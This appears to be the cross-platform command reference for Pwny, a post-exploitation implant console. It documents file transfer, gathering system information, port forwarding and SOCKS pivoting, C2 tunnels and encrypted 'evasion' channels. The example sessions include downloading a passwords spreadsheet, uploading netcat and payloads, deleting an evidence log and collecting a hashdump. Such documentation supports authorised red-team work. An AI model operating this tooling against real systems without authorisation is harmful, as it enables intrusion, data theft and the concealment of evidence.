# Commands Reference

This document covers all **cross-platform** commands available in the Pwny console. These commands work on every supported target (Linux, macOS, iOS).

For platform-specific commands, see:
- [Linux Commands](linux/README.md#linux-specific-commands)
- [macOS Commands](macos/README.md#macos-specific-commands)
- [iOS Commands](ios/README.md#ios-specific-commands)

---

## Command Categories

| Category | Commands |
|----------|----------|
| **Filesystem** | `cat`, `cd`, `chmod`, `cp`, `download`, `edit`, `find`, `list`, `mkdir`, `mv`, `pwd`, `rm`, `rmdir`, `upload` |
| **Gather** | `ifconfig`, `localtime`, `loot`, `netstat`, `pid`, `ps`, `sysinfo`, `whoami` |
| **Pivot** | `portfwd`, `socks` |
| **Manage** | `banner`, `jobs`, `tunnels`, `tip` |
| **Evasion** | `secure`, `unsecure` |

---

## Filesystem Commands

### `cat`

Display the contents of a remote file.

```
Usage: cat <path>
```

```
pwny:/home/user$ cat /etc/hostname
target-machine
```

---

### `cd`

Change working directory on the target.

```
Usage: cd <path>
```

```
pwny:/home/user$ cd /tmp
pwny:/tmp$
```

---

### `chmod`

Change file permissions on the target (POSIX targets).

```
Usage: chmod <mode> <path>
```

```
pwny:/tmp$ chmod 755 script.sh
```

---

### `cp`

Copy a file on the remote target.

```
Usage: cp <src> <dst>
```

```
pwny:/tmp$ cp important.txt /home/user/backup.txt
```

---

### `download`

Download a remote file to the local machine.

```
Usage: download <remote_path> <local_path>
```

```
pwny:/C/Users/target$ download Documents/passwords.xlsx /tmp/passwords.xlsx
[*] Downloading Documents/passwords.xlsx...
[+] Downloaded 14.3 KB to /tmp/passwords.xlsx
```

---

### `edit`

Open a remote file in a local editor, edit it, then upload the changes back.

```
Usage: edit <remote_path>
```

```
pwny:/etc$ edit hosts
```

This downloads the file to a temporary location, opens it in your system editor (`$EDITOR`), and uploads it back after you save and close.

---

### `find`

Search for files on the remote target by name pattern.

```
Usage: find <path> <pattern>
```

```
pwny:/C/Users$ find . "*.docx"
Results
=======

 Mode        Size     Type  Modified             Name
 ----        ----     ----  --------             ----
 -rw-r--r--  24.5 KB  file  2026-03-10 09:00:00  ./target/Documents/report.docx
 -rw-r--r--  8.1 KB   file  2026-03-15 16:30:00  ./target/Desktop/notes.docx
```

---

### `list`

List contents of a remote directory with file details.

```
Usage: list [path]
```

If no path is given, lists the current directory.

```
pwny:/home/user$ list
Listing: .
==========

 Mode        Size     Type  Modified             Name
 ----        ----     ----  --------             ----
 drwxr-xr-x  4.0 KB  dir   2026-03-10 09:00:00  .ssh
 -rw-r--r--  220 B   file  2026-03-01 12:00:00  .bashrc
 -rw-------  1.8 KB  file  2026-03-17 14:20:00  .bash_history
 drwxr-xr-x  4.0 KB  dir   2026-03-15 16:30:00  Documents
```

---

### `mkdir`

Create a directory on the remote target.

```
Usage: mkdir <path>
```

```
pwny:/tmp$ mkdir staging
```

---

### `mv`

Move or rename a file on the remote target.

```
Usage: mv <src> <dst>
```

```
pwny:/tmp$ mv old_name.txt new_name.txt
```

---

### `pwd`

Print the current working directory on the target.

```
pwny:/tmp$ pwd
/tmp
```

---

### `rm`

Delete a file on the remote target.

```
Usage: rm <path>
```

```
pwny:/tmp$ rm evidence.log
```

---

### `rmdir`

Delete a directory on the remote target.

```
Usage: rmdir <path>
```

```
pwny:/tmp$ rmdir staging
```

---

### `upload`

Upload a local file or directory to the remote target.

```
Usage: upload <local_path> <remote_path>
```

```
pwny:/tmp$ upload /opt/tools/nc /tmp/nc
[*] Uploading /opt/tools/nc...
[+] Uploaded 28.5 KB to /tmp/nc
```

Uploading a directory recursively creates the remote directory structure:

```
pwny:/tmp$ upload ./payloads /tmp/payloads
```

---

## Gather Commands

### `ifconfig`

Display network interfaces and IP addresses. Output uses ifconfig-style formatting:

```
pwny:/$ ifconfig
[i] eth0: flags=0x1843<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
[i]         ether 00:0c:29:ab:cd:ef
[i]         inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255
[i]         inet6 fe80::20c:29ff:feab:cdef

[i] lo: flags=0x49<UP,LOOPBACK,RUNNING>  mtu 65536
[i]         inet 127.0.0.1  netmask 255.0.0.0
[i]         inet6 ::1
```

---

### `localtime`

Display the current local time on the target system.

```
pwny:/$ localtime
Mon Mar 17 14:22:15 2026
```

---

### `loot`

Manage collected loot (files/data gathered during the session).

```
Usage: loot [-l|--list] [-r|--remove NAME] [-w|--wipe]
```

| Flag | Description |
|------|-------------|
| `-l`, `--list` | List all collected loot |
| `-r NAME`, `--remove NAME` | Remove a specific loot entry |
| `-w`, `--wipe` | Wipe all collected loot |

```
pwny:/$ loot -l
Loot
====

 Name              Path                          Time
 ----              ----                          ----
 hashdump.txt      /home/user/.pwny/hashdump.txt 2026-03-17 14:30:00
```

---

### `netstat`

List active network connections on the target.

```
Usage: netstat [-l|--listen] [-t|--tcp] [-u|--udp] [-a|--all]
```

| Flag | Description |
|------|-------------|
| `-l`, `--listen` | Show only listening sockets |
| `-t`, `--tcp` | Show only TCP connections |
| `-u`, `--udp` | Show only UDP connections |
| `-a`, `--all` | Show all connections (default) |

```
pwny:/$ netstat -t
Connections
===========

 Proto  Local Address       Remote Address        State        PID
 -----  -------------       --------------        -----        ---
 TCP    0.0.0.0:445         0.0.0.0:*             LISTENING    4
 TCP    192.168.1.50:49832  192.168.1.10:8888     ESTABLISHED  3412
 TCP    192.168.1.50:80     0.0.0.0:*             LISTENING    1024
```

---

### `pid`

Get the current process ID of the implant.

```
pwny:/$ pid
[i] PID: 3412
```

---

### `ps`

List running processes.

```
pwny:/$ ps
Process List
============

 PID    CPU  Name                 Path
 ---    ---  ----                 ----
 1      0.0  systemd              /sbin/systemd
 648    0.1  sshd                 /usr/sbin/sshd
 1024   0.3  bash                 /bin/bash
 3412   0.2  implant              /home/target/implant
 4096   1.2  chrome               /usr/bin/google-chrome
```

---

### `sysinfo`

Display comprehensive system information.

```
pwny:/$ sysinfo

     cOKxc                 Name: Ubuntu 22.04
    .0K0kWc               Kernel: 5.15.0-generic
    .x,':Nd                 Time: Mon Mar 17 14:22:15 2026
   .l... ,Wk.             Vendor: GNU/Linux
  .0.     ,NN,              Arch: x86_64
 .K;       0N0            Memory: 4.2 GB/16.0 GB
..'cl.    'xO:              UUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
,''';c'':Oc',,.
  ..'.  ..,,.
```

The logo and colours change based on the target OS (Linux penguin, macOS apple, iOS icon). On Linux, known distributions (e.g. Kali) display their own logo.

---

### `whoami`

Display the current username on the target.

```
pwny:/$ whoami
target
```

---

## Pivot Commands

### `portfwd`

Port forwarding — tunnel traffic through the implant.

```
Usage: portfwd [-l|--list] [-d ID|--delete ID] [-L HOST] [-P PORT] [-r HOST] [-p PORT]
```

| Flag | Description |
|------|-------------|
| `-l`, `--list` | List existing forwarding rules |
| `-d ID`, `--delete ID` | Delete a forwarding rule by ID |
| `-L HOST` | Local host to listen on |
| `-P PORT` | Local port to listen on |
| `-r HOST` | Remote host to connect to (through the target) |
| `-p PORT` | Remote port to connect to |

**Forward local port 8080 to target's internal web server:**

```
pwny:/$ portfwd -L 127.0.0.1 -P 8080 -r 10.10.10.5 -p 80
[*] Adding rule tcp://10.10.10.5:80...
[+] Rule activated as 0!
```

Now `http://127.0.0.1:8080` on your machine reaches `10.10.10.5:80` through the target.

```
pwny:/$ portfwd -l
Forwarding rules
================

 ID  Rule
 --  ----
 0   127.0.0.1:8080 -> 10.10.10.5:80
```

```
pwny:/$ portfwd -d 0
[*] Flushing rule 0...
[+] Rule 0 deleted!
```

---

### `socks`

SOCKS5 proxy — route traffic through the implant.

```
Usage: socks [-s|--start] [-S|--stop] [-l HOST|--lhost HOST] [-p PORT|--port PORT]
```

| Flag | Description |
|------|-------------|
| `-s`, `--start` | Start the SOCKS5 proxy |
| `-S`, `--stop` | Stop the SOCKS5 proxy |
| `-l HOST`, `--lhost HOST` | Local address to bind (default: `127.0.0.1`) |
| `-p PORT`, `--port PORT` | Local port (default: `1080`) |

```
pwny:/$ socks -s -p 1080
[*] Starting SOCKS5 proxy on 127.0.0.1:1080...
[+] SOCKS5 proxy listening on 127.0.0.1:1080
```

Configure your browser or tools to use `socks5://127.0.0.1:1080` to route all traffic through the compromised target.

```
pwny:/$ socks -S
[*] Stopping SOCKS5 proxy...
[+] SOCKS5 proxy stopped.
```

---

## Manage Commands

### `banner`

Display a random ASCII art banner.

```
pwny:/$ banner
```

Banners are loaded from `pwny/data/banners/` and rendered with ColorScript.

---

### `jobs`

Manage background jobs (e.g., port forwards, SOCKS proxies).

```
Usage: jobs [-l|--list] [-k ID|--kill ID]
```

| Flag | Description |
|------|-------------|
| `-l`, `--list` | List all running jobs |
| `-k ID`, `--kill ID` | Kill a job by ID |

```
pwny:/$ jobs -l
Active Jobs
===========

 ID  Command
 --  -------
 0   portfwd:8080
 1   socks:1080
```

```
pwny:/$ jobs -k 0
[*] Killing job 0...
```

---

### `tunnels`

Manage C2 tunnels (redundant communication channels).

```
Usage: tunnels [-l|--list] [-c URI|--create URI] [-t ID|--tunnel ID]
               [-s|--suspend] [-a|--activate] [-k on|off|--keep-alive on|off]
               [-d SECONDS|--delay SECONDS]
```

| Flag | Description |
|------|-------------|
| `-l`, `--list` | List all tunnels |
| `-c URI`, `--create URI` | Create a new tunnel |
| `-t ID`, `--tunnel ID` | Select tunnel to manage |
| `-s`, `--suspend` | Suspend the selected tunnel |
| `-a`, `--activate` | Activate the selected tunnel |
| `-k on\|off`, `--keep-alive on\|off` | Keep tunnel alive when not connected |
| `-d SECONDS`, `--delay SECONDS` | Delay between reconnect attempts |

```
pwny:/$ tunnels -l
Tunnels
=======

 Self  ID  URI                        Encryption  Status  Delay  Keep-Alive
 ----  --  ---                        ----------  ------  -----  ----------
  *    0   tcp://192.168.1.10:8888    none        active  5s     on
       1   tcp://10.10.10.1:9999      none        idle    5s     off
```

```
pwny:/$ tunnels -c tcp://10.10.10.1:9999
```

---

### `tip`

Display a random usage tip.

```
pwny:/$ tip
[*] Use 'secure' to encrypt C2 communication with AES-256-CBC or ChaCha20.
```

---

## Evasion Commands

### `secure`

Enable encrypted communication between the console and the implant.

```
Usage: secure [-a ALGORITHM|--algorithm ALGORITHM]
```

| Algorithm | Description |
|-----------|-------------|
| `aes256_cbc` | AES-256-CBC (default) |
| `chacha20` | ChaCha20 stream cipher |

```
pwny:/$ secure
```

```
pwny:/$ secure -a chacha20
```

The command runs silently. Use `tunnels -l` to verify encryption status.

---

### `unsecure`

Disable encrypted communication (revert to plaintext TLV).

```
pwny:/$ unsecure
```

Runs silently. Verify with `tunnels -l`.

---

## Process Commands

### `kill`

Kill a process by PID.

```
Usage: kill <pid>
```

```
pwny:/$ kill 4096
```

---

### `killall`

Kill all processes matching a name.

```
Usage: killall <name>
```

```
pwny:/$ killall notepad.exe
```

---

### `envp`

Display environment variables of the implant process.

```
pwny:/$ envp
```

---

## Built-in Help

Type `help` at the prompt to see all available commands organized by category:

```
pwny:/$ help

Core Commands
=============

 Command     Description
 -------     -----------
 help        Show help menu
 exit        Close the session
 load        Load a plugin
 ...

Filesystem
==========

 Command     Description
 -------     -----------
 cat         Display file contents
 cd          Change directory
 ...
```

Use `help <command>` for detailed usage of a specific command.
